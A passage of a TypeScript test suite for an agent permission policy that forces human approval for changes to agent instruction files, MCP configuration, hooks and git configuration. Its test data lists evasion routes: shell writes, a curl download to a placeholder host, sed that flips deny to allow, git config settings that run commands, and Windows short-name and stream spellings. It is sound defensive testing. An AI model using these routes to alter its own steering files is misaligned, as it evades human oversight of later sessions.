import { describe, expect, it, vi } from 'vitest'
import { commandMentionsProtected, commandRewritesTracked, commandWritesGitConfig, commandWritesProtected, protectedConfigKind } from '../../electron/main/services/conversation/kernel/protected-config'
import { evaluatePermission, fullAccessPolicy, guardedDecisions } from '../../electron/main/services/conversation/kernel/permission-policy'
import { assertSessionAllowed, attachPolicy, ThreadRequestRegistry } from '../../electron/main/services/conversation/thread-request-registry'
import { codexApprovalPaths } from '../../electron/main/services/conversation/codex-conversation'
import { describePermissionRequest } from '../../electron/main/services/conversation/claude-permission-request'
import type { ThreadPermissionRule, ThreadRequest } from '../../shared/types/thread'

const rule = (kind: ThreadPermissionRule['kind'], pattern: string, decision: ThreadPermissionRule['decision'] = 'allow'): ThreadPermissionRule => ({ id: `${kind}-${pattern}`, projectRoot: '/repo', kind, pattern, decision, createdAt: 0 })
const posix = { windows: false } as const
const edit = (path: string, rules: ThreadPermissionRule[] = []) => evaluatePermission({ kind: 'approval', toolName: 'Edit', paths: [path] }, '/repo', rules, posix)

describe('files that steer agents', () => {
  it('are found at any depth, in any case, with either slash', () => {
    for (const [path, kind] of [
      ['AGENTS.md', 'instructions'], ['docs/agents.md', 'instructions'], ['packages\\app\\CLAUDE.md', 'instructions'], ['CLAUDE.local.md', 'instructions'],
      ['.github/copilot-instructions.md', 'instructions'], ['.cursor/rules/style.mdc', 'instructions'],
      ['.mcp.json', 'mcp'], ['apps/web/.mcp.json', 'mcp'], ['.cursor/mcp.json', 'mcp'], ['.codex/config.toml', 'mcp'],
      ['.claude/settings.json', 'hooks'], ['.claude/settings.local.json', 'hooks'], ['.claude/hooks/pre.sh', 'hooks'], ['.git/hooks/pre-commit', 'hooks'], ['.husky/pre-push', 'hooks'],
      ['/repo/AGENTS.md', 'instructions']
    ] as const) expect(protectedConfigKind(path), path).toBe(kind)
  })

  it('are found in Windows spellings: drive letters, backslashes, a leading dot, mixed slashes and case', () => {
    for (const [path, kind] of [
      ['C:\\repo\\AGENTS.md', 'instructions'], ['c:/repo/.MCP.JSON', 'mcp'], ['.\\.claude\\settings.json', 'hooks'], ['C:\\repo/.claude\\hooks/pre.ps1', 'hooks'],
      ['.CLAUDE\\SETTINGS.LOCAL.JSON', 'hooks'], ['C:\\repo\\\\docs\\CLAUDE.md', 'instructions'], ['\\\\server\\share\\repo\\.git\\hooks\\pre-commit', 'hooks']
    ] as const) expect(protectedConfigKind(path), path).toBe(kind)
    expect(protectedConfigKind('C:\\repo\\src\\app.ts')).toBeNull()
  })

  it('are asked about as a Windows path, and an ordinary file under a rule is still allowed', () => {
    const windows = { windows: true } as const
    const rules = [rule('path', 'src/**'), rule('path', '*.md')]
    expect(evaluatePermission({ kind: 'approval', toolName: 'Edit', paths: ['C:\\repo\\AGENTS.md'] }, 'C:\\repo', rules, windows)).toMatchObject({ decision: 'ask', guarded: true })
    expect(evaluatePermission({ kind: 'approval', toolName: 'Edit', paths: ['C:\\repo\\.claude\\settings.json'] }, 'C:\\repo', rules, windows)).toMatchObject({ decision: 'ask', guarded: true })
    expect(evaluatePermission({ kind: 'approval', toolName: 'Edit', paths: ['C:\\repo\\src\\a.ts'] }, 'C:\\repo', rules, windows)).toMatchObject({ decision: 'allow' })
    expect(evaluatePermission({ kind: 'approval', toolName: 'Edit', paths: ['C:\\repo\\AGENTS.md'] }, 'C:\\repo', [rule('path', 'AGENTS.md', 'deny')], windows)).toMatchObject({ decision: 'deny' })
  })

  it('leave ordinary files alone', () => {
    for (const path of ['README.md', 'src/agents.ts', 'AGENTS.md.bak', 'notes/my-agents.md', '.mcp.json.example', '.claude/commands.txt', 'docs/hooks/readme.md', 'constructor', '__proto__', '', 'src/.mcp/config.ts']) {
      expect(protectedConfigKind(path), path).toBeNull()
    }
  })

  it('are found in a command that writes them, not in one that only reads them', () => {
    expect(commandWritesProtected('tee AGENTS.md')?.path).toBe('AGENTS.md')
    expect(commandWritesProtected('cp /tmp/x .mcp.json')?.kind).toBe('mcp')
    expect(commandWritesProtected('sed -i s/a/b/ CLAUDE.md')?.kind).toBe('instructions')
    expect(commandWritesProtected('echo hi && mv x .claude/settings.json')?.kind).toBe('hooks')
    expect(commandWritesProtected('dd if=x of=AGENTS.md')?.path).toBe('AGENTS.md')
    expect(commandWritesProtected('Set-Content -Path AGENTS.md -Value x')?.path).toBe('AGENTS.md')
    expect(commandWritesProtected('cat AGENTS.md')).toBeNull()
    expect(commandWritesProtected('sed -n 1,5p AGENTS.md')).toBeNull()
    expect(commandWritesProtected('git add AGENTS.md')).toBeNull()
    expect(commandWritesProtected('cp a.txt b.txt')).toBeNull()
  })
})

describe('approvals of changes to those files', () => {
  it('ask even when a saved rule covers the file, with no rule to remember', () => {
    const verdict = edit('AGENTS.md', [rule('path', 'AGENTS.md'), rule('path', '**/*.md')])
    expect(verdict).toMatchObject({ decision: 'ask', guarded: true, level: 'orange' })
    expect(verdict!.reasons.join(' ')).toMatch(/agent instructions.*every later session/)
    expect(verdict!.warnings?.join(' ')).toMatch(/steering/)
    expect(verdict!.suggestions).toBeUndefined()
  })

  it('ask for .mcp.json and hook files inside folders a rule allows', () => {
    expect(edit('.mcp.json', [rule('path', '.mcp.json')])).toMatchObject({ decision: 'ask', guarded: true })
    expect(edit('.claude/hooks/pre.sh', [rule('path', '.claude/**')])).toMatchObject({ decision: 'ask', guarded: true })
  })

  it('still let a saved deny rule decline them', () => {
    expect(edit('AGENTS.md', [rule('path', 'AGENTS.md', 'deny')])).toMatchObject({ decision: 'deny' })
  })

  it('leave an ordinary file under its rule, unguarded', () => {
    const verdict = edit('src/a.ts', [rule('path', 'src/**')])
    expect(verdict).toMatchObject({ decision: 'allow' })
    expect(verdict).not.toHaveProperty('guarded')
    expect(edit('src/a.ts')).not.toHaveProperty('guarded')
  })

  it('guard a protected file next to an allowed one: the pair asks', () => {
    const verdict = evaluatePermission({ kind: 'approval', toolName: 'MultiEdit', paths: ['src/a.ts', 'CLAUDE.md'] }, '/repo', [rule('path', 'src/**')], posix)
    expect(verdict).toMatchObject({ decision: 'ask', guarded: true })
  })

  it('ask for a command a rule allowed when it writes one of them', () => {
    const rules = [rule('command', 'tee'), rule('command', 'cp')]
    expect(evaluatePermission({ kind: 'approval', command: 'tee AGENTS.md' }, '/repo', rules, posix)).toMatchObject({ decision: 'ask', guarded: true })
    expect(evaluatePermission({ kind: 'approval', command: 'cp a.txt b.txt' }, '/repo', rules, posix)).toMatchObject({ decision: 'allow' })
  })

  it('keep asking under Full access, while ordinary asks are still answered', () => {
    const guarded = edit('AGENTS.md')
    expect(fullAccessPolicy({ kind: 'approval', toolName: 'Edit' }, guarded, 'full-access')).toBe(guarded)
    const plain = evaluatePermission({ kind: 'approval', command: 'R=/repo/src; echo $R | sed "s|$R||"' }, '/repo', [])
    expect(fullAccessPolicy({ kind: 'approval', toolName: 'Bash' }, plain, 'full-access')).toMatchObject({ decision: 'allow' })
  })
})

describe('the approval card for those files', () => {
  const suggestions = [{ type: 'addRules', rules: [{ toolName: 'Edit', ruleContent: '**' }], behavior: 'allow', destination: 'session' }]
  const present = (toolName: string, input: Record<string, unknown>) => describePermissionRequest({ permission_suggestions: suggestions }, toolName, input)

  it('offers one approval and no "allow for this session" for them', () => {
    expect(present('Edit', { file_path: '/repo/AGENTS.md' }).decisions).toEqual(['accept', 'decline'])
    expect(present('Write', { file_path: '/repo/.mcp.json' }).suggestions).toEqual([])
    expect(present('Bash', { command: 'tee CLAUDE.md' }).decisions).toEqual(['accept', 'decline'])
  })

  it('still offers it for ordinary files', () => {
    expect(present('Edit', { file_path: '/repo/src/a.ts' }).decisions).toEqual(['accept', 'acceptForSession', 'decline'])
    expect(present('Bash', { command: 'cat AGENTS.md' }).decisions).toEqual(['accept', 'acceptForSession', 'decline'])
  })
})

/**
 * Audit P1-17, main side: a guarded request is approved once or declined on every provider. Codex lists its own
 * decisions (with "for the session"), so the strip happens where the policy is attached; a session answer that arrives
 * anyway is refused with a code and the request stays pending. The reasons reach the card as C3 codes.
 */
describe('a guarded request on the Codex path (P1-17)', () => {
  const codexDecisions = ['accept', 'acceptForSession', 'decline', 'cancel'] as const
  const codexEdit = (path: string, id = 'codex-1'): ThreadRequest => ({
    id, nativeId: id, nativeMethod: 'item/fileChange/requestApproval', kind: 'approval', toolName: 'fileChange', title: 'Approve file changes', detail: path,
    generation: 1, createdAt: 0, state: 'pending', paths: [path], availableDecisions: [...codexDecisions]
  })

  it.each(['.git/hooks/pre-commit', '.mcp.json'])('guards %s, with the reason and the warning as codes beside the English', path => {
    const verdict = edit(path, [rule('path', '**')])!
    const kind = path === '.mcp.json' ? 'mcp' : 'hooks'
    expect(verdict).toMatchObject({ decision: 'ask', guarded: true })
    expect(verdict.reasonCodes).toEqual([{ code: `thread.protectedConfig.${kind}`, params: { path } }])
    expect(verdict.warningCodes).toEqual([{ code: 'thread.protectedConfig.warning', params: {} }])
    expect(verdict.reasons.join(' ')).toMatch(/every later session/)
    expect(verdict.warnings?.join(' ')).toMatch(/steering/)
    // A command that writes the file carries the same code.
    const command = evaluatePermission({ kind: 'approval', command: `tee ${path}` }, '/repo', [rule('command', 'tee *')], posix)!
    expect(command).toMatchObject({ decision: 'ask', guarded: true })
    expect(command.reasonCodes).toEqual([{ code: `thread.protectedConfig.${kind}`, params: { path } }])
    // Also when the shell asks for its own reason (no rule, or a risky command), so Codex gets no session answer.
    for (const line of [`tee ${path}`, `rm ${path}`, `cp /tmp/x ${path}`]) {
      const asked = evaluatePermission({ kind: 'approval', command: line }, '/repo', [], posix)!
      expect(asked, line).toMatchObject({ decision: 'ask', guarded: true })
      expect(asked.suggestions, line).toBeUndefined()
      expect(guardedDecisions([...codexDecisions], asked), line).toEqual(['accept', 'decline', 'cancel'])
    }
  })

  it('offers Codex no session or remember decision for them, and leaves other requests alone', () => {
    for (const path of ['.git/hooks/pre-commit', '.mcp.json']) {
      expect(guardedDecisions([...codexDecisions], edit(path)), path).toEqual(['accept', 'decline', 'cancel'])
    }
    expect(guardedDecisions([...codexDecisions], edit('src/a.ts'))).toEqual([...codexDecisions])
    expect(guardedDecisions([...codexDecisions], undefined)).toEqual([...codexDecisions])
  })

  it.each(['.git/hooks/pre-commit', '.mcp.json'])('refuses a session answer for %s with a code, keeps the request pending, and then accepts a single approval', async path => {
    const registry = new ThreadRequestRegistry()
    const respond = vi.fn(async () => {})
    const request = codexEdit(path)
    attachPolicy(request, edit(path)!)
    expect(request.availableDecisions).toEqual(['accept', 'decline', 'cancel'])
    registry.register('thread', request, respond)
    await expect(registry.resolve('thread', 'codex-1', 1, { decision: 'acceptForSession' })).rejects.toMatchObject({ refusal: 'guardedDecision', message: expect.stringMatching(/approved once, never for the session/) })
    expect(respond).not.toHaveBeenCalled()
    expect(registry.list('thread').map(request => [request.id, request.state])).toEqual([['codex-1', 'pending']])
    await expect(registry.resolve('thread', 'codex-1', 1, { decision: 'accept' })).resolves.toMatchObject({ state: 'resolved' })
    expect(respond).toHaveBeenCalledOnce()
    expect(registry.list('thread')).toEqual([])
  })

  it('refuses the session answer before any provider is reached, for adapters without a request registry too', () => {
    const guarded = codexEdit('.mcp.json')
    attachPolicy(guarded, edit('.mcp.json')!)
    expect(() => assertSessionAllowed(guarded, { decision: 'acceptForSession' })).toThrow(expect.objectContaining({ refusal: 'guardedDecision' }))
    expect(() => assertSessionAllowed(guarded, { decision: 'accept' })).not.toThrow()
    expect(() => assertSessionAllowed(guarded, { decision: 'decline' })).not.toThrow()
    const plain = codexEdit('src/a.ts')
    attachPolicy(plain, edit('src/a.ts')!)
    expect(plain.availableDecisions).toEqual([...codexDecisions])
    expect(() => assertSessionAllowed(plain, { decision: 'acceptForSession' })).not.toThrow()
    expect(() => assertSessionAllowed(undefined, { decision: 'acceptForSession' })).not.toThrow()
  })

  it('takes the files of a Codex file-change approval from its changes, in either shape, so the policy can see them', () => {
    expect(codexApprovalPaths({ changes: [{ path: '.mcp.json', diff: '+x' }, { path: 'src/a.ts' }, { kind: 'delete' }] })).toEqual(['.mcp.json', 'src/a.ts'])
    expect(codexApprovalPaths({ changes: { '.git/hooks/pre-commit': { add: {} } } })).toEqual(['.git/hooks/pre-commit'])
    expect(codexApprovalPaths({})).toEqual([])
    expect(codexApprovalPaths({ changes: 'x' })).toEqual([])
    expect(edit(codexApprovalPaths({ changes: [{ path: '.mcp.json' }] })[0])).toMatchObject({ guarded: true })
  })
})

/**
 * B16 · homologation's probe of #208 (#184, e2e/homologation/probes/protected-config-probe.mts.txt), with today's
 * protected names in place of #208's (.oxespace/policy.json and oxe.yaml arrive with #208): with saved allow rules for
 * every program the probe used and for every path, and under Full access, a command that names a protected file
 * anywhere, or rewrites tracked files without naming them, still reaches the person, and offers no session answer.
 */
describe('commands that reach protected files (B16)', () => {
  const programs = ['echo', 'printf', 'python', 'python3', 'node', 'git', 'curl', 'cd', 'tar', 'unzip', '7z', 'cp', 'mv', 'sh', 'bash', 'pwsh', 'powershell', 'Set-Content', 'Out-File', 'Expand-Archive', 'tee', 'sed', 'cat', 'jq', 'yq', 'npm', 'npx']
  const probeRules = [...programs.map(pattern => rule('command', pattern)), rule('path', '**'), rule('path', '.*')]
  const run = (command: string) => evaluatePermission({ kind: 'approval', toolName: 'Bash', command }, '/repo', probeRules, posix)

  it.each([
    'echo {} > .mcp.json', 'echo x >> AGENTS.md', "printf '{}' > .mcp.json", 'cp /tmp/p.json .mcp.json', "sed -i 's/deny/allow/' .claude/settings.json",
    'git checkout -- .mcp.json', 'git restore AGENTS.md', 'git apply evil.patch',
    `python -c "open('AGENTS.md','w').write('{}')"`, `node -e "require('fs').writeFileSync('.mcp.json','x')"`,
    'curl -o .mcp.json https://x.invalid/p', 'tar xf p.tar AGENTS.md', 'unzip -o p.zip',
    'cd .claude && echo {} > settings.json', 'Set-Content .claude\\settings.json "{}"', 'Set-Content -Path .\\CLAUDE.md -Value x',
    `powershell -c "Set-Content .claude\\hooks\\pre.ps1 '{}'"`, "sh -c 'echo {} > .git/hooks/pre-commit'",
    "jq '.mcpServers={}' .mcp.json | tee .mcp.json", "yq -i '.x=2' .codex/config.toml", 'npx some-tool --write AGENTS.md',
    // Beyond the probe: case, absolute paths, nesting and escaped quotes.
    'echo x > /repo/docs/agents.MD', 'bash -c "sh -c \\"echo x > CLAUDE.md\\""', 'echo x>AGENTS.md', 'cd /repo/.git/hooks; echo x > pre-push',
    'pushd .cursor && echo {} > mcp.json', "node -e 'fs.writeFileSync(\"C:\\\\repo\\\\AGENTS.md\",\"x\")'"
  ])('guards %j despite the saved rules and Full access, with no session answer', command => {
    const verdict = run(command)!
    expect(verdict, command).toMatchObject({ decision: 'ask', guarded: true })
    expect(verdict.suggestions, command).toBeUndefined()
    expect(verdict.reasonCodes?.length, command).toBeGreaterThan(0)
    expect(fullAccessPolicy({ kind: 'approval', toolName: 'Bash' }, verdict, 'full-access'), command).toMatchObject({ decision: 'ask', guarded: true })
    expect(guardedDecisions(['accept', 'acceptForSession', 'decline'], verdict), command).toEqual(['accept', 'decline'])
  })

  it.each(['cat AGENTS.md', 'grep -n mcp .mcp.json', 'ls .claude', 'ls -la .git/hooks'])('still answers %j, a plain read from the built-in safe list', command => {
    expect(run(command), command).toMatchObject({ decision: 'allow' })
    expect(run(command)?.guarded, command).toBeUndefined()
  })

  it.each([
    ['git checkout main', 'git checkout'], ['git switch feat', 'git switch'], ['git restore .', 'git restore'], ['git apply x.patch', 'git apply'],
    ['git stash pop', 'git stash pop'], ['git stash apply stash@{1}', 'git stash apply'], ['git merge feat', 'git merge'], ['git rebase main', 'git rebase'],
    ['git reset HEAD~1', 'git reset'], ['git clean -fd', 'git clean'], ['git am fix.patch', 'git am'], ['git cherry-pick abc123', 'git cherry-pick'],
    ['git pull', 'git pull'], ['git -C sub checkout main', 'git checkout'], ['bash -c "git pull --rebase"', 'git pull'],
    ['tar xf p.tar', 'tar x'], ['tar -xzf p.tgz', 'tar x'], ['tar --extract -f p.tar', 'tar x'], ['unzip p.zip', 'unzip'], ['7z x p.7z', '7z x'],
    ['Expand-Archive p.zip .', 'Expand-Archive'], ['powershell -c "Expand-Archive p.zip -DestinationPath ."', 'Expand-Archive']
  ])('treats %j as rewriting tracked files (%s): never rule-approved', (command, label) => {
    expect(commandRewritesTracked(command)).toBe(label)
    const verdict = run(command)!
    expect(verdict, command).toMatchObject({ decision: 'ask', guarded: true })
    expect(verdict.reasonCodes, command).toContainEqual({ code: 'thread.protectedConfig.rewritesTracked', params: { command: label } })
  })

  it.each(['git commit -m "fix"', 'git push', 'git add src/a.ts', 'git status', 'git diff', 'git log --oneline', 'git fetch', 'git branch feature', 'tar cf out.tar src', 'unzip -l p.zip', 'echo ok > notes.txt'])(
    'leaves %j to the saved rules', command => {
      expect(commandRewritesTracked(command), command).toBeNull()
      expect(commandMentionsProtected(command), command).toBeNull()
      expect(run(command)?.guarded, command).toBeUndefined()
    })
})

describe('Windows spellings of a protected file (B16)', () => {
  it.each([
    ['AGENTS.md.', 'instructions'], ['AGENTS.md ', 'instructions'], ['AGENTS.md...', 'instructions'], ['AGENTS.md::$DATA', 'instructions'], ['.mcp.json:hidden', 'mcp'],
    ['AGENTS~1.MD', 'instructions'], ['CLAUDE~1.MD', 'instructions'], ['MCP~1.JSO', 'mcp'], ['.claude\\SETTIN~1.JSO', 'hooks'], ['CLAUDE~1\\settings.json', 'hooks'],
    ['.git\\hooks\\PRE-CO~1', 'hooks'], ['.\\AGENTS.md', 'instructions'], ['sub/../AGENTS.md', 'instructions'], ['.claude/./settings.json', 'hooks'],
    ['C:\\repo\\.claude\\settings.json.', 'hooks'], ['/repo/AGENTS.MD', 'instructions']
  ])('reads %j as the protected file (%s)', (path, kind) => {
    expect(protectedConfigKind(path)).toBe(kind)
    expect(edit(path, [rule('path', '**')]), path).toMatchObject({ decision: 'ask', guarded: true })
  })

  it.each(['README~1.MD', 'AGENTS.md.bak', 'src/agents.ts', 'notes/readme.md', 'docs/hooks/x.md', 'C:', '.claude/commands.txt'])('leaves %j alone', path => {
    expect(protectedConfigKind(path)).toBeNull()
  })

  it('finds the same spellings inside commands', () => {
    expect(commandMentionsProtected('echo x > AGENTS.md::$DATA')).toMatchObject({ kind: 'instructions' })
    expect(commandMentionsProtected('copy x CLAUDE~1.MD')).toMatchObject({ kind: 'instructions' })
  })
})

/**
 * B16 · L2 of the #387 safe-git review: git's configuration names commands git runs later (core.sshCommand,
 * core.fsmonitor, aliases, filter drivers), so an agent that writes it plants a command for the next git call.
 */
describe('git configuration (B16)', () => {
  const run = (command: string) => evaluatePermission({ kind: 'approval', toolName: 'Bash', command }, '/repo', [rule('command', 'git'), rule('command', 'gh')], posix)

  it.each([
    ['.gitconfig', 'GITCON~1'], ['/home/me/.gitconfig', '/home/me/GITCON~1'], ['C:\\Users\\me\\.gitconfig', 'C:\\Users\\me\\GITCON~1'],
    ['.config/git/config', '.config/git/CONFIG~1'], ['/home/me/.config/git/attributes', '/home/me/CONFIG~1/git/attributes'], ['.config/git/ignore', '.config/git/IGNORE~1'],
    ['.git/config', '.git/CONFIG~1'], ['C:\\repo\\.git\\config', 'C:\\repo\\GIT~1\\config'], ['.git/config.worktree', '.git/CONFIG~1.WOR'],
    ['.git/worktrees/feat/config.worktree', '.git/WORKTR~1/feat/config.worktree'], ['.git/info/attributes', '.git/info/ATTRIB~1'],
    ['/etc/gitconfig', '/etc/GITCON~1'], ['C:\\Program Files\\Git\\etc\\gitconfig', 'C:\\PROGRA~1\\Git\\etc\\GITCON~1'],
    ['C:\\Users\\me\\AppData\\Local\\Programs\\Git\\etc\\gitconfig', 'C:\\Users\\me\\AppData\\Local\\Programs\\Git\\etc\\GITCON~1']
  ])('reads %j as git configuration, and its short name %j too', (path, short) => {
    expect(protectedConfigKind(path), path).toBe('git')
    expect(protectedConfigKind(short), short).toBe('git')
    const verdict = edit(path, [rule('path', '**')])!
    expect(verdict, path).toMatchObject({ decision: 'ask', guarded: true })
    // The policy names the file with forward slashes.
    expect(verdict.reasonCodes, path).toEqual([{ code: 'thread.protectedConfig.git', params: { path: path.replace(/\\/g, '/') } }])
  })

  it.each(['.gitattributes', 'src/.gitattributes', 'src/.git-notes.md', '.gitignore', '.gitmodules', 'docs/config', '.git/HEAD', '.git/info/exclude', 'src/git/config.ts', '.gitconfig.example'])(
    'leaves %j alone', path => {
      expect(protectedConfigKind(path), path).toBeNull()
    })

  it.each([
    ['git config --global core.sshCommand x', '~/.gitconfig'], ['git config core.fsmonitor x', '.git/config'], ['git config -f ~/.gitconfig a b', '~/.gitconfig'],
    ['git config --system core.pager evil', 'etc/gitconfig'], ['git config --local alias.st "!sh x"', '.git/config'], ['git config --worktree core.hooksPath h', '.git/config.worktree'],
    ['git config --file=.git/config a b', '.git/config'], ['git config --global --add alias.x "!x"', '~/.gitconfig'], ['git config --unset core.editor', '.git/config'],
    ['git config --global --replace-all a b', '~/.gitconfig'], ['git config --rename-section a b', '.git/config'], ['git config --remove-section filter.lfs', '.git/config'],
    ['git config --global --edit', '~/.gitconfig'], ['git config set --global core.sshCommand x', '~/.gitconfig'], ['git config unset core.editor', '.git/config'],
    ['git -C sub config core.fsmonitor x', '.git/config'], ['git config --type=bool core.x true', '.git/config'], ['echo ok && git config core.pager x', '.git/config'],
    ['bash -c "git config --global core.sshCommand x"', '~/.gitconfig']
  ])('treats %j as writing git configuration (%s)', (command, path) => {
    expect(commandWritesGitConfig(command), command).toEqual({ path, kind: 'git' })
    expect(commandWritesProtected(command), command).toEqual({ path, kind: 'git' })
  })

  it.each([
    'git config --get user.name', 'git config -l', 'git config --list --show-origin', 'git config --global --get core.editor', 'git config --get-regexp alias',
    'git config user.name', 'git config get user.name', 'git config list', 'git config --show-origin --get user.email', 'git config -f build.cfg a b',
    'git -c core.pager=cat log', 'git status', 'git log --oneline'
  ])('leaves %j alone: a read, an ordinary file or a one-command setting', command => {
    expect(commandWritesGitConfig(command), command).toBeNull()
  })

  // #388 security review H1: a prefix, a wrapper or a computed name before git does not hide the write.
  it.each([
    'X=1 git config core.fsmonitor x', 'GIT_DIR=.git X=2 git config core.fsmonitor x', 'env git config core.fsmonitor x', 'env -i PATH=/bin git config core.fsmonitor x',
    'sudo git config --system core.pager x', 'sudo -u me git config core.fsmonitor x', 'command git config core.fsmonitor x', 'timeout 5 git config core.fsmonitor x',
    'nohup git config core.fsmonitor x', 'nice -n 10 git config core.fsmonitor x', 'echo core.fsmonitor | xargs git config core.fsmonitor x', 'xargs -n1 git config core.fsmonitor x',
    'cmd /c git config core.fsmonitor x', 'cmd /c "git config core.fsmonitor x"', 'exec git config core.fsmonitor x', 'git-config core.fsmonitor x',
    '/usr/lib/git-core/git-config core.fsmonitor x', '"C:\\Program Files\\Git\\cmd\\git.exe" config core.fsmonitor x', '`which git` config core.fsmonitor x',
    '$(which git) config core.fsmonitor x', '$GIT config core.fsmonitor x', '${GIT} config core.fsmonitor x', 'G=git; $G config core.fsmonitor x'
  ])('H1 · finds the git config write in %j', command => {
    expect(commandWritesGitConfig(command), command).toMatchObject({ kind: 'git' })
  })

  // H2: git accepts any unambiguous prefix of a long option.
  it.each([
    ['git config --unset-a core.x', '.git/config'], ['git config --unset-al core.x', '.git/config'], ['git config --uns core.x', '.git/config'],
    ['git config --remove-sec filter.lfs', '.git/config'], ['git config --rename-s a b', '.git/config'], ['git config --replace-a a b', '.git/config'],
    ['git config --ad alias.x y', '.git/config'], ['git config --edi', '.git/config'], ['git config --glob --edi', '~/.gitconfig'],
    ['git config --glo core.sshCommand x', '~/.gitconfig'], ['git config --sys core.pager x', 'etc/gitconfig'], ['git config --wor core.x y', '.git/config.worktree'],
    ['git config --fil ~/.gitconfig a b', '~/.gitconfig'], ['git config --fil=.git/config a b', '.git/config'], ['git config --re a b', '.git/config'],
    ['git config -e', '.git/config'], ['git config --global -e', '~/.gitconfig']
  ])('H2 · reads %j as a write (%s)', (command, path) => {
    expect(commandWritesGitConfig(command), command).toEqual({ path, kind: 'git' })
  })

  it('H2 · every write option, at every unambiguous prefix, is a write', () => {
    for (const option of ['--add', '--unset', '--unset-all', '--replace-all', '--rename-section', '--remove-section', '--edit']) {
      for (let length = 3; length <= option.length; length++) {
        const command = `git config ${option.slice(0, length)} a b`
        expect(commandWritesGitConfig(command), command).toMatchObject({ kind: 'git' })
      }
    }
    for (const read of ['--get-a', '--get-r', '--get-u', '--li', '--show-o', '--get-colorb']) {
      expect(commandWritesGitConfig(`git config ${read} a`), read).toBeNull()
    }
  })

  // M: computed --file values, more places, aliases that write config, and other commands that write git config.
  it.each([
    ['git config -f "$(git rev-parse --git-dir)/config" core.fsmonitor x'], ['git config -f `git rev-parse --git-dir`/config core.fsmonitor x'],
    ['git config -f $GIT_DIR/config core.fsmonitor x'], ['git config --file=$GIT_DIR/config a b'], ['git config -f ../.git/x a b'],
    ['git config -f $XDG_CONFIG_HOME/git/config core.pager x'], ['git -c alias.x=config x core.fsmonitor evil'], ['git -c "alias.y=!sh -c evil" y'],
    ['git maintenance register'], ['git maintenance start'], ['git lfs install'], ['git lfs install --local'], ['git-lfs install'], ['gh auth setup-git']
  ])('M · guards %j', command => {
    expect(commandWritesGitConfig(command), command).toMatchObject({ kind: 'git' })
    expect(run(command), command).toMatchObject({ decision: 'ask', guarded: true })
  })

  it.each(['$XDG_CONFIG_HOME/git/config', '${XDG_CONFIG_HOME}/git/ignore', '%XDG_CONFIG_HOME%\\git\\attributes', '$env:XDG_CONFIG_HOME\\git\\config',
    '/home/me/config/git/config', '~/config/git/ignore', 'C:\\Users\\me\\config\\git\\attributes', '$HOME/config/git/config',
    '.git/modules/sub/config.worktree', '.git/modules/sub/info/attributes', '.git/modules/sub/config', '.git/modules/a/modules/b/config', 'C:\\ProgramData\\Git\\config', 'c:/programdata/git/config'])(
    'M · reads %j as git configuration', path => {
      expect(protectedConfigKind(path), path).toBe('git')
    })

  // L: these write .git/config, but only URLs, refs and paths git does not run.
  it.each([
    'git remote add origin https://x.invalid/r.git', 'git remote set-url origin https://x.invalid/r.git', 'git branch --set-upstream-to=origin/main',
    'git submodule update --init', 'git worktree add ../wt feat', 'git -c core.pager=cat log', 'git -c alias.st=status st', 'git maintenance run', 'git lfs pull',
    'gh auth status', 'git config -f build.cfg a b', '$GIT config --get user.name', 'env git config --list'
  ])('L · leaves %j alone', command => {
    expect(commandWritesGitConfig(command), command).toBeNull()
  })

  // #388 re-check. M1/M2: a write target the shell computes that ends like a git configuration file.
  it.each([
    'echo x >> "$(git rev-parse --git-dir)/config"', 'echo x > $(git rev-parse --git-dir)/config', 'echo x > `git rev-parse --git-dir`/config',
    'printf x > $GIT_DIR/config', 'echo x > ${GIT_DIR}/config.worktree', 'echo x > %GIT_DIR%\\info\\attributes', 'echo x 2>> $D/info/attributes',
    'echo x | tee -a "$(git rev-parse --git-common-dir)/config"', 'echo x | tee $GIT_DIR/config', 'cp /tmp/evil $(git rev-parse --git-dir)/config',
    'mv evil ${XDG_CONFIG_HOME}/git/ignore', 'mv evil "$(git rev-parse --git-dir)/info/attributes"', 'echo x > ${XDG_CONFIG_HOME}/git/config', 'echo x > ${XDG_CONFIG_HOME}/git/ignore',
    'Set-Content -Path "$env:GIT_DIR\\config" -Value x', '"x" | Out-File $env:XDG_CONFIG_HOME\\git\\attributes', 'Add-Content -Path:"$d/config" x',
    'Copy-Item evil -Destination "$env:USERPROFILE\\.gitconfig"', 'echo x > $HOME/.gitconfig'
  ])('M1 · guards the computed write target in %j', command => {
    expect(commandWritesProtected(command), command).toMatchObject({ kind: 'git' })
    expect(run(command), command).toMatchObject({ decision: 'ask', guarded: true })
  })

  // M3, L3, L4: PowerShell's Start-Process and call operator, a computed subcommand, an alias from the environment.
  it.each([
    'Start-Process git -ArgumentList "config core.fsmonitor x"', "Start-Process -FilePath git.exe -ArgumentList 'config','--global','core.sshCommand','x'",
    'saps git "config core.fsmonitor x"', 'Start-Process git -Args "config --unset-a core.x"', "& 'git.exe' @args", '& git @gitArgs',
    'git $(echo config) core.fsmonitor x', 'git `echo config` a b', 'git $SUB core.x y', 'git -C sub $SUB a b',
    'git --config-env=alias.x=EVIL x', 'git --config-env alias.x=EVIL x'
  ])('M3/L3/L4 · guards %j', command => {
    expect(commandWritesGitConfig(command), command).toMatchObject({ kind: 'git' })
    expect(run(command), command).toMatchObject({ decision: 'ask', guarded: true })
  })

  // L2, L5 and computed targets that are not git configuration stay clean.
  it.each([
    'npm $CMD config set x y', 'docker $ARGS config a b', 'echo $x config a b', 'echo x > $OUT/notes.txt', 'echo x > "$(pwd)/build.log"',
    'cp $(git rev-parse --show-toplevel)/README.md /tmp/x', 'cat "$(git rev-parse --git-dir)/config"', 'Start-Process npm -ArgumentList "config set x y"',
    'Start-Process git -ArgumentList "config --get user.name"', 'git log 2>&1', 'git status > $OUT/status.txt', 'git --config-env=core.pager=PAGER log',
    'tee $LOG/out.txt', 'cp src/config /tmp/config'
  ])('L2 · leaves %j alone', command => {
    expect(commandWritesProtected(command), command).toBeNull()
  })

  it.each(['src/config/git/config', 'app/config/git/attributes', 'packages/a/config/git/ignore', 'config/git/config'])('L5 · leaves the project file %j alone', path => {
    expect(protectedConfigKind(path), path).toBeNull()
  })

  it('asks every time for a git config write, whatever a saved rule says, with no session answer', () => {
    const rules = [rule('command', 'git'), rule('command', 'git config'), rule('path', '**')]
    for (const command of ['git config --global core.sshCommand x', 'git config core.fsmonitor x', 'git config -f ~/.gitconfig a b']) {
      const verdict = evaluatePermission({ kind: 'approval', toolName: 'Bash', command }, '/repo', rules, posix)!
      expect(verdict, command).toMatchObject({ decision: 'ask', guarded: true })
      expect(verdict.suggestions, command).toBeUndefined()
      expect(verdict.reasonCodes?.[0], command).toMatchObject({ code: 'thread.protectedConfig.git' })
